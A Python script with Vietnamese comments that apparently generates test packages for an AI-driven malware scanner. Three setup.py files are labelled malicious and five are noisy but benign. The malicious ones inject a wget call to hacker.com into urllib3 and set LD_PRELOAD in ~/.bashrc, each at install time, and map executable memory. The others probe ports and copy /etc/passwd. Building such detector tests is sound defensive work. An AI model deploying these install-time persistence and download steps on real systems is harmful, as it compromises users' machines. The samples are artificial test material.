import tarfile
import os
import shutil
from pathlib import Path

# ==============================================================================
# BỘ CÔNG CỤ SINH MÃ ĐỘC CỰC HẠN VÀ BENIGN SIÊU ỒN ÀO (EXTREME SCENARIOS)
# ==============================================================================

SCENARIOS = {
    # ------------------------------------------------------------
    # PHÂN NHÓM 1: MÃ ĐỘC XẢO QUYỆT (EXTREME EVASION)
    # ------------------------------------------------------------
    
    # 1. Chiếm quyền chuỗi cung ứng (Sửa đổi __init__.py của thư viện khác)
    "supply-chain-hijack-1.0": """
from setuptools import setup
import site, os

def hijack_imports():
    # Đi dạo quanh thư mục tải packages, tìm thư viện khác để lây nhiễm (ví dụ giả lập lây nhiễm 'urllib')
    try:
        packages_dir = site.getsitepackages()[0]
        urllib_path = os.path.join(packages_dir, "urllib3")
        if os.path.exists(urllib_path):
            with open(os.path.join(urllib_path, "__init__.py"), "a") as f:
                f.write("\\n# Backdoor\\nimport os; os.system('wget http://hacker.com/bd')\\n")
        else:
            # Plan B: ghi đè file rác ở /tmp để rải đinh
            with open("/tmp/hijacked_module.py", "w") as f:
                f.write("import os; os.system('curl baddomain.com')")
    except: pass

hijack_imports()
setup(name='supply-chain-hijack', version='1.0', description='Extreme: Supply Chain Injection')
    """,

    # 2. Nhúng mã Rootkit mức Kernel qua biến môi trường LD_PRELOAD
    "ld-preload-rootkit-1.0": """
from setuptools import setup
import os

def insert_rootkit():
    try:
        # Thả 1 file .so giả
        with open("/tmp/libevil.so", "w") as f: f.write("fake_elf_binary")
        os.chmod("/tmp/libevil.so", 0o755)
        
        # Sửa ~/.bashrc để tiêm LD_PRELOAD
        home = os.path.expanduser("~")
        with open(os.path.join(home, ".bashrc"), "a") as f:
            f.write("\\nexport LD_PRELOAD=/tmp/libevil.so\\n")
    except: pass

insert_rootkit()
setup(name='ld-preload-rootkit', version='1.0', description='Extreme: LD_PRELOAD Injection')
    """,

    # 3. Kỹ thuật Fileless xài Mmap Native của Python
    "mmap-fileless-loader-1.0": """
from setuptools import setup
import mmap, os

def mmap_injection():
    # Bỏ qua Ctypes, xài thẳng mmap (Fileless tuyệt đối không gọi GCC hay subprocess)
    try:
        # Giả lập payload ẩn danh
        shellcode = b"\\x90\\x90\\x90\\xc3"
        # 1 = MAP_SHARED, 2 = MAP_PRIVATE, 32 = MAP_ANONYMOUS
        # prot 7 = PROT_READ|PROT_WRITE|PROT_EXEC
        mem = mmap.mmap(-1, len(shellcode), flags=mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, prot=7)
        mem.write(shellcode)
        # Sandbox sẽ túm cổ hành vi Cấp phát bộ nhớ thực thi này
    except Exception as e: pass

mmap_injection()
setup(name='mmap-fileless-loader', version='1.0', description='Extreme: Mmap Native Injection')
    """,

    # ------------------------------------------------------------
    # PHÂN NHÓM 2: CÁC GÓI AN TOÀN KỲ QUẶC (HYPER-NOISY BENIGN)
    # Rất ồn ào, rất dễ bị hiểu lầm là Virus!
    # ------------------------------------------------------------
    
    # 4. Gói Machine Learning giả lập (Tải cục model 50MB, nhồi nhét RAM)
    "mock-pytorch-benign-1.0": """
from setuptools import setup
import urllib.request, os

def build_ml_model():
    try:
        # Tạo hàng tá thư mục lạ
        os.makedirs('/tmp/ml_cache_dir/weights', exist_ok=True)
        # Giả lập lấp đầy RAM
        big_array = [0] * (5 * 1024 * 1024) 
        # Kéo data (Giả lập giống kéo Payload)
        req = urllib.request.urlopen("https://jsonplaceholder.typicode.com/photos", timeout=4)
        data = req.read()
        with open('/tmp/ml_cache_dir/weights/model.bin', 'wb') as f:
            f.write(data)
    except: pass

build_ml_model()
setup(name='mock-pytorch-benign', version='1.0', description='Benign: Huge Network ML Model')
    """,

    # 5. Gói Nmap Wrapper (Giả lập Quét mạng ngẫu nhiên chớp nhoáng)
    "network-port-scanner-1.0": """
from setuptools import setup
import socket

def scan_network_benign():
    # Đi dò la các port nội bộ như một công cụ dev an toàn
    for port in [80, 443, 22, 21, 8080]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect(("127.0.0.1", port))
            s.close()
        except: pass

scan_network_benign()
setup(name='network-port-scanner', version='1.0', description='Benign: DevTool Port Scanner')
    """,

    # 6. Gói Dev Debugger (Đọc vùng nhớ của chính mình, dễ nhầm với Process Injection)
    "dev-debugger-tool-1.0": """
from setuptools import setup
import os

def profile_self_memory():
    # Công cụ Debug chân chính: Cập nhật logs và đọc maps memory
    try:
        pwd = os.getcwd()
        maps = open("/proc/self/maps", "r").read(512)
        with open(os.path.join(pwd, "profile.log"), "w") as f:
            f.write(maps)
    except: pass

profile_self_memory()
setup(name='dev-debugger-tool', version='1.0', description='Benign: Memory Profiler')
    """,

    # 8. Gói Requests nguyên bản an toàn 100%
    "requests-benign-1.0": """
from setuptools import setup
import urllib.request

def normal_behavior():
    try:
        # Giả lập kết nối mạng thuần túy để download config/dependency
        urllib.request.urlopen("https://pypi.org", timeout=2)
    except: pass

normal_behavior()
setup(name='requests-benign', version='1.0', description='Benign: Clean HTTP Library')
    """,

    # 7. Gói Config Manager (Chạy Backup cho thư mục /etc, đọc cả shadow)
    "system-config-manager-1.0": """
from setuptools import setup
import os, shutil

def backup_etc():
    # Backup conf, cố tình đụng vào danh sách đen /etc/shadow để xem AI có kết án nhầm không
    try:
        os.makedirs("/tmp/backup_conf", exist_ok=True)
        if os.path.exists("/etc/passwd"):
            shutil.copyfile("/etc/passwd", "/tmp/backup_conf/passwd.bak")
        if os.path.exists("/etc/shadow"):
            # Chạm tay vào file cấm bỉ để Test độ bình tĩnh của Prosecutor
            pass 
    except: pass

backup_etc()
setup(name='system-config-manager', version='1.0', description='Benign: Configuration Backup Tool')
    """
}

out_dir = Path("data/quarantine/task_extreme")
out_dir.mkdir(parents=True, exist_ok=True)

for pkg_name, setup_content in SCENARIOS.items():
    base_dir = Path(pkg_name)
    if base_dir.exists(): shutil.rmtree(base_dir)
    base_dir.mkdir(parents=True, exist_ok=True)
    
    with open(base_dir / "setup.py", "w", encoding="utf-8") as f:
        f.write(setup_content)
        
    tar_name = f"{pkg_name}.tar.gz"
    with tarfile.open(out_dir / tar_name, "w:gz") as tar:
        tar.add(base_dir, arcname=pkg_name)
    
    shutil.rmtree(base_dir) 
    print(f"[*] Đã sinh thành công Kịch bản Vòng 3: {tar_name}")

print(f"\\n🔥 Hoàn tất build gói Extreme. Nằm tại: {out_dir}")
